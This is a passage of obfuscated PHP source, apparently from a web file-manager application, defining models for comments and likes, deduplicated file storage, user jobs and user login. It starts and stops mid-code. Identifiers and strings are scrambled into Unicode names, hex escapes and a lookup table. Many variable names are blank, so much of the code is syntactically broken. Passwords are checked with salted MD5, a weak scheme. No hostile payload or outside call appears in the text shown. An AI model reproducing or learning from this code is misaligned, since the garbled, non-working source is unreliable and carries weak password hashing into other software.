addComment($Ҋ) { $ =& $_SERVER[ܮ]; if ($Ҋ[$[2212]]) { $甕 = $this->where(array($[2213] => $Ҋ[$[2212]]))->find(); if (!$甕 || $甕[$[188]] != $Ҋ[$[188]] || $甕[$[589]] != $Ҋ[$[589]]) { return !1; } $this->where(array($[2213] => $Ҋ[$[2212]]))->setAdd($[2214], 1); } $Ҋ[$[2215]] = 0; $Ҋ[$[2214]] = 0; $Ҋ[$[848]] = 1; return $this->add($Ҋ); } public function commentCount($, $, $ = false) { $Ԕ =& $_SERVER[ܮ]; if (!$) { return array(); } if (is_string($) || is_int($)) { $ = array($); } $ռ = array($Ԕ[589], $Ԕ[2216] => $Ԕ[585]); $ӡ = array($Ԕ[589] => array($Ԕ[7], $), $Ԕ[188] => $); if ($) { $ӡ[$Ԕ[1593]] = $; } $֏̟ = $this->field($ռ)->where($ӡ)->group($Ԕ[589])->select(); return array_to_keyvalue($֏̟, $Ԕ[589], $Ԕ[585]); } public function starTarget($Ӟ, $֖) { $ށ =& $_SERVER[ܮ]; $ = $Ӟ + self::TYPE_STAR_OFFSET; $ = array($ށ[1593] => USER_ID, $ށ[188] => $, $ށ[589] => $֖); $迼 = $this->where($)->find(); if ($迼) { return $this->where(array($ށ[487] => $迼[$ށ[487]]))->delete(); } $ = array($ށ[2212] => 0, $ށ[1593] => USER_ID, $ށ[848] => 1, $ށ[168] => $ށ[12], $ށ[188] => $, $ށ[589] => $֖, $ށ[2215] => 0, $ށ[2214] => 0); return $this->add($); } public function starTargetCount($՞, $Ъ) { $۹Ȯ =& $_SERVER[ܮ]; $ڻ = $Ъ + self::TYPE_STAR_OFFSET; $Ϧ = $this->commentCount($՞, $ڻ); $ = $this->commentCount($՞, $ڻ, USER_ID); return array($۹Ȯ[2217] => $Ϧ, $۹Ȯ[2218] => $); } public function starTargetUserList($, $ޗ) { $̢ =& $_SERVER[ܮ]; $ׯ = $ + self::TYPE_STAR_OFFSET; $ = array($̢[589] => $ޗ, $̢[188] => $ׯ); $ܼ = $this->where($)->count(); $ = array($̢[332] => $ܼ, $̢[2219] => array()); if (!$ܼ) { return $; } $ͯ = $this->field($̢[1593])->where($)->limit(500)->select(); $ͯ = array_to_keyvalue($ͯ, $̢[12], $̢[1593]); $[$̢[2219]] = Model($̢[597])->userListInfo($ͯ); return $; } public function prasiseUserList($) { $ =& $_SERVER[ܮ]; $ = array($[2220] => $); $ֹ = $this->where($)->find(); $ = _get($ֹ, $[2215], 0); $ = array($[332] => $, $[2219] => array()); if (!$) { return $; } $ = Model($[2221])->field($[1593])->where($)->limit(500)->select(); $ = array_to_keyvalue($, $[12], $[1593]); $[$[2219]] = Model($[597])->userListInfo($); return $; } public function remove($㧶) { $ =& $_SERVER[ܮ]; $ = array($[2213] => $㧶); $ߝ = $this->where($)->find(); if ($ߝ[$[2212]]) { $this->where(array($[2213] => $ߝ[$[2212]]))->setAdd($[2214], -1); } return $this->removeArray($㧶); } public function edit($, $ǖɸ) { $Ͼ =& $_SERVER[ܮ]; $ = array($Ͼ[2213] => $); return $this->where($)->save(array($Ͼ[2222] => $ǖɸ)); } public function prasise($) { $ =& $_SERVER[ܮ]; $𣥎 = Model($[2223]); $ = array($[2213] => $, $[1968] => USER_ID); $䑤 = $𣥎->where($)->find(); if (!$䑤) { $𣥎->add($); $ = $this->where(array($[2213] => $))->setAdd($[2215], 1); } else { $𣥎->where($)->delete(); $ = $this->where(array($[2213] => $))->setAdd($[2215], -1); } return $; } public function targetInfo($ª, $) { $ =& $_SERVER[ܮ]; $փ = array($[670] => $ª, $[671] => $); $܏ = $this->where($փ)->count(); $ = "\x52\111\x47\110\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\143\x6f\155\155\145\156\x74\137\x70\162\141\151\163\145\40\163\164\x61\x72\40\x6f\156\x20\143\x6f\155\155\x65\156\x74\56\x63\157\x6d\155\x65\156\164\x49\x44\x20\75\x20\163\164\x61\162\x2e\x63\x6f\x6d\x6d\x65\156\164\111\x44"; $ܢ = $this->alias($[429])->where($փ)->join($, $[2224])->count(); $٦ = array($[2225] => $܏, $[2226] => $ܢ); return $٦; } public function listData($) { $֣ =& $_SERVER[ܮ]; if (isset($[$֣[2227]])) { if ($[$֣[2227]]) { $[$֣[2220]] = array($֣[1182], intval($[$֣[2227]])); } unset($[$֣[2227]]); } if (isset($[$֣[2228]])) { if ($[$֣[2228]]) { $[$֣[2220]] = array($֣[1179], intval($[$֣[2228]])); } unset($[$֣[2228]]); } return $this->_listData($); } private function _listData($̒) { $ =& $_SERVER[ܮ]; $뫩 = $this->where($̒)->_makeOrder()->selectPage(100); $this->_listAppendParent($뫩[$[446]]); $this->_listAppendUser($뫩[$[446]]); $this->_listAppendMeta($뫩[$[446]]); return $뫩; } private function _makeOrder() { $礻 =& $_SERVER[ܮ]; $ܡ = array($礻[2215], $礻[2214], $礻[231]); $ = Input::get($礻[544], $礻[7], $礻[512], $ܡ); $ب׎ = Input::get($礻[545], $礻[7], $礻[1970], array($礻[2229], $礻[540])); $ʊ = $ . $礻[53] . $ب׎; return $this->order($ʊ); } private function _listAppendParent(&$Ԗ) { $ӊ =& $_SERVER[ܮ]; $Ңߐ = array_unique(array_to_keyvalue($Ԗ, $ӊ[12], $ӊ[2212])); $Ңߐ = array_remove_value($Ңߐ, $ӊ[228]); if (!$Ңߐ) { return; } $ĳ = $this->where(array($ӊ[2213] => array($ӊ[7], $Ңߐ)))->select(); $ĳ = array_to_keyvalue($ĳ, $ӊ[2220]); foreach ($Ԗ as &$Ӆ) { if (isset($ĳ[$Ӆ[$ӊ[2212]]])) { $Ӆ[$ӊ[2230]] = $ĳ[$Ӆ[$ӊ[2212]]]; } } unset($Ӆ); } private function _listAppendUser(&$랿) { $ =& $_SERVER[ܮ]; $ٻ = array_unique(array_to_keyvalue($랿, $[12], $[1593])); $ٻ = array_remove_value($ٻ, $[228]); if (count($ٻ) == 0) { return; } foreach ($랿 as $) { if (isset($[$[2230]])) { $ٻ[] = $[$[2230]][$[1593]]; } } $ˬ = Model($[617])->userListInfo($ٻ); foreach ($랿 as &$) { $[$[684]] = $ˬ[$[$[1593]]]; if (isset($[$[2230]])) { $[$[2230]][$[684]] = $ˬ[$[$[2230]][$[1593]]]; } } unset($); } private function _listAppendMeta(&$ǲ) { $ל =& $_SERVER[ܮ]; $ɳ = array_unique(array_to_keyvalue($ǲ, $ל[12], $ל[2220])); $ɳ = array_remove_value($ɳ, $ל[228]); if (!$ɳ) { return; } foreach ($ǲ as $ڥ) { if (isset($ڥ[$ל[2230]])) { $ɳ[] = $ڥ[$ל[2230]][$ל[2220]]; } } $ = $this->metaList($ɳ); if (!$) { return !1; } foreach ($ǲ as &$ڥ) { $ڥ[$ל[555]] = $[$ڥ[$ל[2220]]]; if (isset($ڥ[$ל[2230]])) { $ڥ[$ל[2230]][$ל[555]] = $[$ڥ[$ל[2230]][$ל[2220]]]; } } unset($ڥ); } private function metaList($ٔ) { $Ȯ =& $_SERVER[ܮ]; if (!$ٔ) { return array(); } $ٍ = array($Ȯ[2220] => array($Ȯ[7], $ٔ)); $͌қ = Model($Ȯ[2231])->where($ٍ)->select(); $͌қ = array_to_keyvalue_group($͌қ, $Ȯ[2220]); foreach ($͌қ as $Ԇ => $Ҷ) { $υ = array(); foreach ($Ҷ as $) { $υ[$[$Ȯ[95]]] = $[$Ȯ[451]]; } $͌қ[$Ԇ] = $υ; } return $͌қ ? $͌қ : array(); } public function removeTarget($܎酰, $) { $ʳǵ =& $_SERVER[ܮ]; if (!$) { return !0; } $ = is_array($) ? $ : array($); $ = array($ʳǵ[188] => $܎酰, $ʳǵ[589] => array($ʳǵ[7], $)); $ = $this->field($ʳǵ[2220])->where($)->select(); $Υ = array_to_keyvalue($, $ʳǵ[12], $ʳǵ[2220]); return $this->removeArray($Υ); } public function removeArray($) { $ꇒ =& $_SERVER[ܮ]; if (!$) { return !0; } $ = is_array($) ? $ : array($); $ = array($ꇒ[2220] => array($ꇒ[7], $)); Model($ꇒ[2223])->where($)->delete(); Model($ꇒ[2232])->where($)->delete(); return $this->where($)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\x65\x5f\x63\x6f\x6e\164\x65\156\x74\163"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\x54\x69\155\x65", "\164\x69\x6d\145", "\x69\x6e\x73\145\162\x74", "\146\165\x6e\143\x74\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\154\x65"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\141\155\x65" => "\x69\157\137\x66\151\x6c\145\x5f\155\145\x74\141", "\155\x65\x74\x61\x46\x69\x65\154\144" => "\146\x69\x6c\145\x49\x44"); public function fileInfo($) { $􆋜 =& $_SERVER[ܮ]; static $ݾ = array(); if (!isset($ݾ[$])) { $՘ = $􆋜[2233]; $ܩ = Model($􆋜[560])->field($՘)->where(array($􆋜[558] => $))->find(); $ݾ[$] = $ܩ; } return $ݾ[$]; } public function addFileByContent($볛 = '', $, $慊Ț = '') { $቙ =& $_SERVER[ܮ]; $͔ = TEMP_PATH . $቙[2234]; if (!is_dir($͔)) { mk_dir($͔); } $ڒ = $͔ . $቙[2235] . rand_string(16); $͍ = file_put_contents($ڒ, $볛); if ($͍ === !1 || strlen($볛) != $͍) { return !1; } $ = $this->addFile($ڒ, $, $慊Ț, !0); if (file_exists($ڒ)) { @unlink($ڒ); } return $; } public function createFileName($ӗ, $, $ۢ = false, $ݝ = false) { $ =& $_SERVER[ܮ]; $܂ = IO::init($[8]); $Ң = $this->_makeFilePath($ӗ, $, $܂, $ۢ, $ݝ); $ӱ = $܂->pathFather($Ң); static $ա = false; $Ċ = $[2236] . md5($ӱ); if (!$ա && !Cache::get($Ċ)) { $ա = !0; $ = IO::mkdir($ӱ); if (!IO::exist($ . $[897])) { IO::mkfile($ . $[897]); } Cache::set($Ċ, 1, 3600 * 2); } return $Ң; } public function _makeFilePath($, $Ӎ, $, $ = false, $ = false) { $ı =& $_SERVER[ܮ]; $ƻ = Model($ı[871])->get($ı[2237]); $ = $ı[1428] . $Ӎ[$ı[487]] . $ı[499] . date($ı[2238]); $돯 = $ . rand_string(5) . short_id(100); $ = str_replace($ı[8], $ı[11], KodIO::clear($)); $Џ = $->ext($); if (!$) { $ƻ = $ı[950]; } switch ($ƻ) { case $ı[2239]: if ($Џ) { $돯 = $돯 . $ı[10] . $Џ; } if ($Џ == $ı[2174]) { $돯 .= $ı[1397]; } break; case $ı[2240]: $ = Model($ı[871])->get($ı[872]); $ = substr(md5($ı[873] . $ . date($ı[847])), 0, 8); $ = $ı[1428] . $Ӎ[$ı[487]] . $ı[499] . date($ı[2241]) . $ . $ı[8]; if ($Џ == $ı[2174]) { $ .= $ı[1397]; } $̏ = $ı[2242] . $ . $; CacheLock::lock($̏); $돯 = $ . $; if (IO::exist($ . $)) { $ = substr($, 0, strlen($) - strlen($Џ)); $р = $ ? substr($, 0, 5) : ($ ? substr($, 0, 5) : rand_string(5)); $р .= rand_string(3); $돯 = $ . $ . $р; if ($Џ) { $돯 = $돯 . $ı[10] . $Џ; } } if (IO::isOsDriver($돯) && !IO::isUploadServer($돯)) { if (IO::exist($돯)) { CacheLock::unlock($̏); return $돯; } $؇ = IO::setContent($돯, $ı[12]); if (!$؇) { show_json($ı[2243], !1); } } CacheLock::unlock($̏); break; case $ı[950]: break; default: break; } return $돯; } public function addFileByRemote($, $, $胒 = array()) { $ˮ =& $_SERVER[ܮ]; if (!IO::isFile($)) { return !1; } $ = $胒[$ˮ[563]] ? $胒[$ˮ[563]] : $ˮ[12]; $כ = IO::hashMd5($, $); $ݥ = KodIO::parse($); $֬ = array($ˮ[640] => IO::size($), $ˮ[2244] => 1, $ˮ[509] => $, $ˮ[921] => $ݥ[$ˮ[487]], $ˮ[510] => $, $ˮ[2245] => $胒[$ˮ[694]] ? $胒[$ˮ[694]] : IO::hashSimple($), $ˮ[2246] => $כ ? $כ : $); if ($´ = $this->addFileCheckExist($֬[$ˮ[694]], $֬[$ˮ[563]], $֬[$ˮ[79]])) { return $´; } return $this->addFileData($֬); } private function addFileData($؜Ǎ) { $ =& $_SERVER[ܮ]; if (!$؜Ǎ) { return !1; } if (!IO::isFile($؜Ǎ[$[87]])) { return !1; } $؜Ǎ[$[79]] = intval($؜Ǎ[$[79]]); if (!$؜Ǎ[$[79]] && strlen($؜Ǎ[$[694]]) > 32) { $؜Ǎ[$[79]] = intval(substr($؜Ǎ[$[694]], 32)); } $ï = $this->add($؜Ǎ); return $this->find($ï); } public function addFile($Ѓ, $, $̱, $ = false) { $ƚ =& $_SERVER[ܮ]; $ = IO::hashSimple($Ѓ); $ۓ = IO::size($Ѓ); $ݖ = $ۓ <= 1024 * 1024 * 10 ? IO::hashMd5($Ѓ) : $ƚ[12]; $߹ = $ƚ[2247] . $; CacheLock::lock($߹); if ($ݖ && $) { $ = $this->addFileCheckExist($, $ݖ, $ۓ); if ($) { CacheLock::unlock($߹); return $; } } $ = $this->addFileMake($Ѓ, $, $ۓ, $, $ݖ, $̱, $); $湺 = $this->addFileData($); if (!$湺) { return !1; } CacheLock::unlock($߹); if (!$ݖ && $湺) { $this->fileMd5Check($湺); } return $湺; } public function fileMd5Check($) { $珳 =& $_SERVER[ܮ]; $ = array($[$珳[557]], $[$珳[87]]); $͑ɼ = $珳[2248] . $[$珳[87]]; $淓 = $珳[2249] . $[$珳[557]]; TaskQueue::add($珳[2250], $, $͑ɼ, $淓); } public function fileMd5Set($ے, $) { $¥ =& $_SERVER[ܮ]; $Ȣ = $this->find($ے); if (!$Ȣ || $Ȣ[$¥[563]]) { return; } $۲ = IO::hashMd5($); if (!$۲) { return $¥[12]; } $this->where(array($¥[557] => $ے))->save(array($¥[563] => $۲)); } public function addFileMake($¿, $߻, $䥒, $, $ǳ, $, $) { $ꮨ =& $_SERVER[ܮ]; $ųș = $this->createFileName($, $߻, $, $ǳ); $ε = get_path_father($ųș); $۱ = get_path_this($ųș); if ($) { $޴ = IO::move($¿, $ε, !1, $۱); } else { $޴ = IO::copy($¿, $ε, !1, $۱); } if (!$޴) { return !1; } $򖳧 = IO::init($޴); $򖳧->cacheMethod($ꮨ[179], $򖳧->path, $ꮨ[176]); if (IO::size($޴) != $䥒) { return !1; } $ܸȚ = array($ꮨ[640] => $䥒, $ꮨ[2244] => 1, $ꮨ[509] => $, $ꮨ[921] => $߻[$ꮨ[487]], $ꮨ[510] => $ųș, $ꮨ[2245] => $, $ꮨ[2246] => $ǳ); return $ܸȚ; } public function addFileCheckExist($қ, $䡱, $) { $ =& $_SERVER[ܮ]; $Ŝ = $this->findByHash($қ, $䡱); if (!$Ŝ) { return !1; } $Ղ = array($[2244] => intval($Ŝ[$[2251]]) + 1, $[640] => $); $this->where(array($[558] => $Ŝ[$[557]]))->save($Ղ); return $Ŝ; } public function remove($ߡ) { $this->linkCountChange($ߡ, !1); $this->clearEmpty(); return !0; } public function linkAdd($ߍ) { $this->linkCountChange($ߍ, !0); } public function linkCountChange($Ͱ, $몙) { $܄ =& $_SERVER[ܮ]; if (!$Ͱ) { return; } if (!is_array($Ͱ)) { $Ͱ = array($Ͱ); } $ӊ = array(); foreach ($Ͱ as $̚) { $δ = $̚ . $܄[12]; if (!$ӊ[$δ]) { $ӊ[$δ] = 0; } $ӊ[$δ]++; } $ָ = array(); foreach ($ӊ as $̚ => $) { $δ = $ . $܄[12]; if (!$ָ[$δ]) { $ָ[$δ] = array(); } $ָ[$δ][] = $̚; } foreach ($ָ as $ => $푥) { if (!$푥) { continue; } $ = $몙 ? $ : -intval($); $݆ = array($܄[557] => array($܄[7], $푥)); if ($ < 0) { $݆[$܄[2251]] = array($܄[1183], abs($)); } $this->where($݆)->setAdd($܄[2251], $); } } public function findByHash($ߥ, $ɶ = false) { $ؘ =& $_SERVER[ܮ]; if (!$ߥ && !$ɶ) { return !1; } $҅ = array($ؘ[2245] => $ߥ); if ($ɶ) { $҅ = array($ؘ[2246] => $ɶ); } return $this->order($ؘ[2252])->where($҅)->find(); } public function clearEmpty($ = 1) { $Ͻ =& $_SERVER[ܮ]; $㆑ = time() - 3600 * 24 * $; $Ï = $Ͻ[2253] . $㆑; $첍 = $this->where($Ï)->select(); if (!$첍) { return; } $ = new Task($Ͻ[2254], $Ͻ[12], count($첍)); foreach ($첍 as $ʎ) { $->update(1); $this->resetFile($ʎ); } $->end(); } public function resetFile($̎) { $ͬΪ =& $_SERVER[ܮ]; $ = array($ͬΪ[558] => $̎[$ͬΪ[557]]); $Ԇғ = Model($ͬΪ[1534])->where($)->count(); $Ք = Model($ͬΪ[2255])->where($)->count(); $ = intval($Ԇғ) + intval($Ք); if ($ == 0) { Model($ͬΪ[2256])->delete($̎[$ͬΪ[557]]); $this->where($)->delete(); $this->metaSet($̎[$ͬΪ[557]], null, null); if (!IO::isFile($̎[$ͬΪ[87]])) { write_log(array($ͬΪ[2257], ACTION, $̎), $ͬΪ[1371]); return !1; } IO::remove($̎[$ͬΪ[87]]); write_log(ACTION . $ͬΪ[992] . KodUser::id() . $ͬΪ[2258] . $̎[$ͬΪ[557]] . $ͬΪ[2045] . $̎[$ͬΪ[79]] . $ͬΪ[199] . $̎[$ͬΪ[87]], $ͬΪ[2257]); return; } if ($̎[$ͬΪ[2251]] != $) { $this->where($)->save(array($ͬΪ[2244] => $)); } } public function storageInfo($ = false) { $ҕ =& $_SERVER[ܮ]; $ = $this->count() + 0.0; $£ = 0; $ٴ = 1; $ۆ = 0; $ۓ = 5000; for ($ = 0; $ < $; $ = $ + $ۓ) { $ = $this->limit($, $ۓ)->select(); foreach ($ as $) { $ٴ += $[$ҕ[79]] * $[$ҕ[2251]]; $£ += $[$ҕ[79]] * ($[$ҕ[2251]] - 1); $ۆ += $[$ҕ[2251]]; } } $ = array($ҕ[2259] => $ٴ, $ҕ[2260] => $£, $ҕ[2261] => $£ / $ٴ, $ҕ[83] => $, $ҕ[2262] => $ۆ); return $; } } goto aֈ; A: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x6a\157\142\114\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\x64\x65\x73\x63", "\x73\x6f\162\164"); const JOB_KEY = "\163\x65\x6c\x66\x4a\x6f\142\114\x69\163\164"; public function listData($򜉚 = false, $ = "\x73\157\162\x74", $𻅁 = false) { return parent::listData($򜉚, $, $𻅁); } public function remove($ߡ) { return parent::remove($ߡ); } public function add($) { $ =& $_SERVER[ܮ]; if ($this->findByName($[$[32]])) { return !1; } $[$[2204]] = $this->getSort(); return parent::insert($); } private function getSort() { $ӌź =& $_SERVER[ܮ]; $ = parent::listData(); $η = array_to_keyvalue($, $ӌź[12], $ӌź[2204]); return empty($η) ? 0 : max($η) + 1; } public function update($͍, $ֹ) { $Ӵ =& $_SERVER[ܮ]; $ = parent::listData($͍); $³ٝ = $this->findByName($ֹ[$Ӵ[32]]); if (!$ || $³ٝ && $³ٝ[$Ӵ[487]] != $[$Ӵ[487]]) { return !1; } return parent::update($͍, $ֹ); } public function setUserJob($, $Өξ) { $̯ =& $_SERVER[ܮ]; if (!is_array($Өξ)) { $Өξ = array($Өξ); } $Җ = parent::listData(); $ = array_to_keyvalue($Җ, $̯[32]); $ДЯ = $̯[463]; foreach ($Өξ as $) { if ($[$]) { $ДЯ .= $[$][$̯[487]] . $̯[50]; } else { $ = $this->add($); $ДЯ .= $ . $̯[50]; } } $ДЯ = rtrim($ДЯ, $̯[50]); Model($̯[617])->metaSet($, self::JOB_KEY, $ДЯ); } public function getUserJob($) { $̬ = Model($_SERVER[ܮ][617])->metaGet($); return $this->getUserJobInfo($̬[self::JOB_KEY]); } public function getUserJobInfo($) { $Ɵ =& $_SERVER[ܮ]; $϶ = explode($Ɵ[50], $); $ = parent::listData(); $ = array_remove_key($, $Ɵ[231]); $Ԑۘ̀ = array(); foreach ($϶ as $ٟ) { if (isset($[$ٟ])) { $Ԑۘ̀[] = $[$ٟ]; } } return $Ԑۘ̀; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\141\x6d\x65" => "\165\163\145\x72\x5f\155\145\164\x61", "\155\x65\x74\x61\x46\x69\145\154\x64" => "\x75\163\145\162\x49\x44"); protected $simpleField = "\165\163\145\162\x49\x44\x2c\156\151\143\153\x4e\x61\x6d\145\54\156\141\x6d\145\x2c\141\x76\141\164\141\162\x2c\x73\x65\x78\54\163\x74\141\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ȯ) { $ =& $_SERVER[ܮ]; $ = $[2672]; return array($[2263] => array($ȯ[0], $), $[2265] => array($ȯ[0], $), $[2673] => array($ȯ[0], $)); } protected function ___getInfo($) { $ش = $this->getInfoSimple($); if (!$ش || !is_array($ش)) { return array(); } return $this->_getInfoApply($ش); } protected function ___getInfoFull($ͰӬ) { $ = $this->getInfoSimple($ͰӬ); if (!$ || !is_array($)) { return array(); } return $this->_getInfoApply($, !0); } protected function ___getInfoSimple($) { $ =& $_SERVER[ܮ]; if (!$) { return array(); } $㤌 = $this->where(array($[1593] => intval($)))->find(); if (!$㤌 || !is_array($㤌)) { return array(); } $㤌[$[2374]] = Action($[2375])->parseUrl($㤌[$[2374]]); return $㤌; } private function _getInfoApply($짾, $ = false) { $Б =& $_SERVER[ܮ]; if (!$짾) { return $짾; } $ݷ = md5($Б[2674] . $짾[$Б[1051]] . $Б[2675] . $짾[$Б[32]]); $짾 = $this->_listDataApplyItem($짾); $ = Model($Б[1534])->metaGet($짾[$Б[90]][$Б[191]]); $짾[$Б[2676]] = $ݷ; $짾[$Б[90]][$Б[2465]] = isset($[$Б[2466]]) ? $[$Б[2466]] : null; if ($) { $짾[$Б[555]] = $this->metaGet($짾[$Б[1593]]); } return $짾; } protected function getInfoSimpleOuter($) { $ =& $_SERVER[ܮ]; if (!$ || $ == 0) { return array($[1593] => $[228], $[32] => $[173] . LNG($[2677]) . $[175], $[2374] => STATIC_PATH . $[2678]); } $ڇЌ = $this->cacheFunctionGet($[2274], $); $ = array_field_key($ڇЌ, explode($[50], $this->simpleField)); if (!$) { return array($[1593] => $[1381], $[32] => $[173] . LNG($[2679]) . $[175], $[2374] => STATIC_PATH . $[2680]); } $[$[2374]] = Action($[2375])->parseUrl($[$[2374]]); return $; } protected function groupUser($䭳) { } public static function errorLang($͉ʌ) { $ԥ =& $_SERVER[ܮ]; $ = array(self::ERROR_USER_NOT_EXISTS => $ԥ[2681], self::ERROR_USER_PASSWORD_ERROR => $ԥ[2682], self::ERROR_USER_EXIST_NAME => $ԥ[2683], self::ERROR_USER_EXIST_PHONE => $ԥ[2684], self::ERROR_USER_EXIST_EMAIL => $ԥ[2685], self::ERROR_USER_LOGIN_LOCK => $ԥ[2686], self::ERROR_IP_NOT_ALLOW => $ԥ[2687], self::ERROR_USER_EXIST_NICKNAME => $ԥ[2688]); $ = LNG($[$͉ʌ]); if ($͉ʌ == self::ERROR_USER_LOGIN_LOCK) { $䕂 = (int) Model($ԥ[1490])->get($ԥ[2689]); if ($䕂 > 60) { $ = str_replace($ԥ[91], ceil($䕂 / 60), $); } } return $; } protected function metaSet($, $깙 = null, $ = null) { $this->clearCache($); return parent::metaSet($, $깙, $); } public function getInfoByMeta($Ȱ, $٫) { $Ѝ =& $_SERVER[ܮ]; $ = Model($Ѝ[2690])->where(array($Ѝ[95] => $Ȱ, $Ѝ[451] => $٫))->find(); if ($) { return $this->getInfo($[$Ѝ[1593]]); } return !1; } public function userLoginCheck($谻, $ȍ, $ = false) { $Ν =& $_SERVER[ܮ]; $ = $this->userLoginFind($谻); if (!$) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($[$Ν[1593]], $ȍ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $ ? $this->getInfoFull($[$Ν[1593]]) : $this->getInfo($[$Ν[1593]]); } public function userLoginFind($) { $ڂ˨ =& $_SERVER[ܮ]; $ = array($ڂ˨[32] => $, $ڂ˨[2476] => $, $ڂ˨[380] => $, $ڂ˨[2691] => $, $ڂ˨[1168] => $ڂ˨[1170]); if ($this->nickNameRpt()) { unset($[$ڂ˨[2476]]); } return $this->where($)->find(); } public function clearCache($з) { $Ħ =& $_SERVER[ܮ]; $this->cacheFunctionClear($Ħ[2273], $з); $this->cacheFunctionClear($Ħ[2274], $з); $this->cacheFunctionClear($Ħ[2692], $з); } public function userPasswordCheck($Ȋ, $) { $ =& $_SERVER[ܮ]; $ = $this->where(array($[1593] => intval($Ȋ)))->find(); $ϊ = $this->metaGet($Ȋ); $ = isset($ϊ[$[2693]]) ? $ϊ[$[2693]] : $[12]; if (md5($ . trim($)) !== $[$[1051]]) { return !1; } return !0; } public function userAdd($) { $ǟ =& $_SERVER[ܮ]; $ք = array($ǟ[509] => $[$ǟ[32]], $ǟ[2694] => $[$ǟ[2373]], $ǟ[2695] => isset($[$ǟ[380]]) ? $[$ǟ[380]] : $ǟ[12], $ǟ[2696] => isset($[$ǟ[2691]]) ? $[$ǟ[2691]] : $ǟ[12], $ǟ[2697] => isset($[$ǟ[2476]]) ? $[$ǟ[2476]] : $[$ǟ[32]], $ǟ[2698] => isset($[$ǟ[2374]]) ? $[$ǟ[2374]] : $ǟ[12], $ǟ[2699] => isset($[$ǟ[2700]]) ? $[$ǟ[2700]] : 1, $ǟ[2701] => $[$ǟ[1051]], $ǟ[2267] => isset($[$ǟ[2168]]) ? $[$ǟ[2168]] : 1024 * 1024 * 20, $ǟ[2268] => 0, $ǟ[2702] => 0, $ǟ[2313] => isset($[$ǟ[848]]) ? $[$ǟ[848]] : 1); if (!empty($[$ǟ[1593]])) { $ք[$ǟ[1593]] = $[$ǟ[1593]]; } $鐜 = $this->_checkExist($); if ($鐜 !== !0) { return $鐜; } if (!empty($ք[$ǟ[2374]]) && strlen($ք[$ǟ[2374]]) > 255) { $ք[$ǟ[2374]] = $ǟ[12]; } $ = $this->add($ք); $̎ = array($ǟ[2701] => $ք[$ǟ[1051]], $ǟ[2697] => $ք[$ǟ[2476]], $ǟ[2703] => $[$ǟ[2272]]); $this->userEdit($, $̎); Model($ǟ[1534])->userRootAdd($); return $; } protected function userEditTest($ԟ, $ݪ) { return $this->call($_SERVER[ܮ][2704], $ԟ, $ݪ); } protected function userEdit($༫, $ѥ٥) { $ =& $_SERVER[ܮ]; $귆 = $this->getInfoSimple($༫); if (!$귆) { return !1; } $ = $this->_checkExist($ѥ٥, $༫); if ($ !== !0) { return $; } if (isset($ѥ٥[$[1051]]) && trim($ѥ٥[$[1051]]) != $[12]) { $ު = $this->metaGet($༫); if (empty($ު[$[2693]])) { $ު[$[2693]] = rand_string(10); Model($[597])->metaSet($༫, $[2693], $ު[$[2693]]); } $ѥ٥[$[1051]] = md5($ު[$[2693]] . trim($ѥ٥[$[1051]])); } else { unset($ѥ٥[$[1051]]); } if (!empty($ѥ٥[$[2374]]) && strlen($ѥ٥[$[2374]]) > 255) { $ѥ٥[$[2374]] = $[12]; } if (isset($ѥ٥[$[2476]])) { $this->setNamePinyin($༫, $ѥ٥[$[2476]]); } if (isset($ѥ٥[$[2272]])) { $ = $[1493] . $༫; $櫴 = $[1491]; $̴Ƿ = $ѥ٥[$[2272]] ? $ѥ٥[$[2272]] : $[12]; $ = Model($[1490])->get($, $櫴); $ = $ ? $ : $[12]; if ($ != $̴Ƿ) { if (!$̴Ƿ && $) { Model($[1490])->remove($, $櫴); } else { if ($̴Ƿ) { Model($[1490])->set($, $̴Ƿ, $櫴); } } } unset($ѥ٥[$[2272]]); Model($[617])->metaSet($༫, $[2272], $̴Ƿ); } if (empty($ѥ٥)) { return !0; } $this->where(array($[1968] => $༫))->save($ѥ٥); $this->clearCache($༫); return !0; } public function setNamePinyin($ȫ, $˔ = false) { $ͫ =& $_SERVER[ܮ]; if (!$˔) { $ = $this->getInfoSimple($ȫ); $˔ = $[$ͫ[2476]] ? $[$ͫ[2476]] : $[$ͫ[32]]; } $ץј = Model($ͫ[617]); if (!Input::check($˔, $ͫ[677])) { return $ץј->metaSet($ȫ, array($ͫ[552] => $ͫ[12], $ͫ[551] => $ͫ[12])); } return $ץј->metaSet($ȫ, array($ͫ[552] => str_replace($ͫ[53], $ͫ[12], Pinyin::get($˔)), $ͫ[551] => Pinyin::get($˔, $ͫ[678]))); } private function nickNameRpt() { $ =& $_SERVER[ܮ]; $Ԡ = Model($[871])->get($[2705]); $ά = $GLOBALS[$[6]][$[468]][$[2705]]; $ = !is_null($Ԡ) ? $Ԡ : $ά; return !!$; } private function _checkExist($Ǌ, $¤ = false) { $ =& $_SERVER[ܮ]; $ɔΦ = array($[32] => UserModel::ERROR_USER_EXIST_NAME, $[2476] => UserModel::ERROR_USER_EXIST_NICKNAME, $[380] => UserModel::ERROR_USER_EXIST_EMAIL, $[2691] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ɔΦ[$[2476]]); } $ = $¤ ? array($[1593] => array($[2706], $¤)) : array(); foreach ($ɔΦ as $Րȵ => $̖) { $˟ = array(); foreach ($ɔΦ as $ => $ٔ) { if (isset($Ǌ[$]) && $Ǌ[$]) { $˟[] = $Ǌ[$]; } } if (!$˟) { continue; } $臹 = array_merge(array($Րȵ => array($[7], $˟)), $); $ɮǤ = $this->where($臹)->find(); if 